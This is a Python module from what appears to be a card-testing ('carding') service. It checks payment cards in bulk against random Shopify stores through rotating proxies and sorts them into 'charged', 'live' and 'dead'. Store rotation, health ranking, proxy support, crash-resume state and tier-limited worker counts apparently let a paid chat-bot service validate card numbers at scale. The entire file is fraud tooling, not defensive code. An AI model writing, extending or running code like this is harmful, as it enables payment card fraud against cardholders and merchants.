"""Mass check engine — async worker pool, progress tracking, store rotation.

Runs N concurrent workers (tier-limited), checks cards against random stores,
reports progress every 3 seconds via callback.
Supports state persistence for resume after crash.
"""

import asyncio
import random
import time
import json
import logging
import sqlite3
from dataclasses import dataclass, field
from typing import Callable, Awaitable

from core.card_parser import Card
from core.checker import shopify_check, CheckResult
from core.loader import pick_store
from core.store_health import StoreHealthCache, _record_check_internal

logger = logging.getLogger(__name__)


@dataclass
class MassCheckResult:
    charged: list[tuple[Card, CheckResult]] = field(default_factory=list)
    live: list[tuple[Card, CheckResult]] = field(default_factory=list)
    dead: list[tuple[Card, CheckResult]] = field(default_factory=list)
    total: int = 0
    checked: int = 0
    duration: float = 0.0


def save_state(conn: sqlite3.Connection, user_id: int, chat_id: int,
               cards: list[Card], stores: list[str], price_range: str,
               checked: int, message_id: int = None):
    """Save mass check state to SQLite for resume."""
    try:
        cards_json = json.dumps([c.raw for c in cards])
        stores_json = json.dumps(stores)
        conn.execute(
            """INSERT INTO mass_check_state
               (user_id, chat_id, message_id, cards_total, cards_checked,
                cards_json, stores_json, price_range, status)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'running')""",
            (user_id, chat_id, message_id, len(cards), checked,
             cards_json, stores_json, price_range),
        )
        conn.commit()
    except Exception as e:
        logger.warning("Failed to save mass check state: %s", e)


def update_state(conn: sqlite3.Connection, state_id: int, checked: int):
    """Update progress on saved state."""
    try:
        conn.execute(
            "UPDATE mass_check_state SET cards_checked = ? WHERE id = ?",
            (checked, state_id),
        )
        conn.commit()
    except Exception:
        pass


def complete_state(conn: sqlite3.Connection, state_id: int):
    """Mark mass check as complete."""
    try:
        conn.execute(
            "UPDATE mass_check_state SET status = 'complete' WHERE id = ?",
            (state_id,),
        )
        conn.commit()
    except Exception:
        pass


def get_pending_state(conn: sqlite3.Connection, user_id: int) -> sqlite3.Row | None:
    """Get any incomplete mass check state for a user."""
    return conn.execute(
        "SELECT * FROM mass_check_state WHERE user_id = ? AND status = 'running' ORDER BY started_at DESC LIMIT 1",
        (user_id,),
    ).fetchone()


def clear_state(conn: sqlite3.Connection, state_id: int):
    """Delete a mass check state."""
    conn.execute("DELETE FROM mass_check_state WHERE id = ?", (state_id,))
    conn.commit()


async def mass_check(
    cards: list[Card],
    stores: list[str],
    workers: int,
    timeout: int = 15,
    progress_callback: Callable[[int, int, MassCheckResult, float], Awaitable[None]] = None,
    progress_interval: float = 3.0,
    proxy_provider: Callable[[], Awaitable[str]] = None,
    state_conn: sqlite3.Connection = None,
    state_id: int = None,
    health_cache: StoreHealthCache = None,
) -> MassCheckResult:
    """Run mass check on a list of cards.

    Args:
        cards: List of Card objects to check
        stores: List of Shopify store URLs
        workers: Max concurrent workers (tier-limited)
        timeout: Per-request timeout in seconds
        progress_callback: Async callback(checked, total, result, elapsed)
        progress_interval: Seconds between progress updates
        proxy_provider: Async callable returning a proxy URL, or None
        state_conn: Optional SQLite conn for state persistence
        state_id: Optional state row ID for progress updates
        health_cache: Optional store health cache for scoring
    Returns:
        MassCheckResult with charged/live/dead lists
    """
    total = len(cards)
    result = MassCheckResult(total=total)
    semaphore = asyncio.Semaphore(workers)
    used_stores: set[str] = set()
    max_used_cache = 500
    start_time = time.time()
    last_progress = 0.0
    last_state_save = 0.0
    health_batch = []
    lock = asyncio.Lock()

    # Sort stores by health score if cache available
    if health_cache:
        stores = health_cache.get_ranked(stores)

    async def check_one(card: Card):
        nonlocal last_progress, last_state_save
        async with semaphore:
            store = pick_store(stores, used_stores)
            if len(used_stores) > max_used_cache:
                used_stores.clear()
            if not store:
                async with lock:
                    result.dead.append((card, CheckResult(
                        status="DEAD", message="no_stores_available",
                        gateway="Shopify Payments", price=0.0, store="", card=card,
                    )))
                    result.checked += 1
                return

            proxy = None
            if proxy_provider:
                try:
                    proxy = await proxy_provider()
                except Exception:
                    proxy = None

            check_result = await shopify_check(card, store, proxy=proxy, timeout=timeout)

            # Update store health (memory + DB batched)
            if health_cache:
                success = check_result.status in ("CHARGED", "LIVE", "LIVE_3DS")
                health_cache.update_score(store, success)
                if state_conn or (health_cache and health_cache.conn):
                    db_conn = state_conn or health_cache.conn
                    try:
                        _record_check_internal(db_conn, store, success, 0)
                    except Exception:
                        pass

            async with lock:
                if check_result.status == "CHARGED":
                    result.charged.append((card, check_result))
                elif check_result.status.startswith("LIVE"):
                    result.live.append((card, check_result))
                else:
                    result.dead.append((card, check_result))

                result.checked += 1
                checked = result.checked

            # Progress callback
            now = time.time()
            if progress_callback and (now - last_progress) >= progress_interval:
                last_progress = now
                elapsed = now - start_time
                try:
                    await progress_callback(checked, total, result, elapsed)
                except Exception as e:
                    logger.warning("Progress callback error: %s", e)

            # Save state + batch commit health every 5 seconds
            if state_conn and state_id and (now - last_state_save) >= 5.0:
                last_state_save = now
                update_state(state_conn, state_id, checked)
                try:
                    state_conn.commit()
                except Exception:
                    pass

    tasks = [asyncio.create_task(check_one(c)) for c in cards]
    await asyncio.gather(*tasks, return_exceptions=True)

    result.duration = time.time() - start_time

    # Final progress update
    if progress_callback:
        try:
            await progress_callback(result.checked, total, result, result.duration)
        except Exception:
            pass

    # Mark state complete
    if state_conn and state_id:
        complete_state(state_conn, state_id)

    logger.info(
        "Mass check complete: total=%d charged=%d live=%d dead=%d duration=%.1fs",
        total, len(result.charged), len(result.live), len(result.dead), result.duration,
    )
    return result


def format_duration(seconds: float) -> str:
    """Format seconds as 'Xh Ym Zs'."""
    h = int(seconds // 3600)
    m = int((seconds % 3600) // 60)
    s = int(seconds % 60)
    if h > 0:
        return f"{h}h {m}m {s}s"
    return f"{m}m {s}s"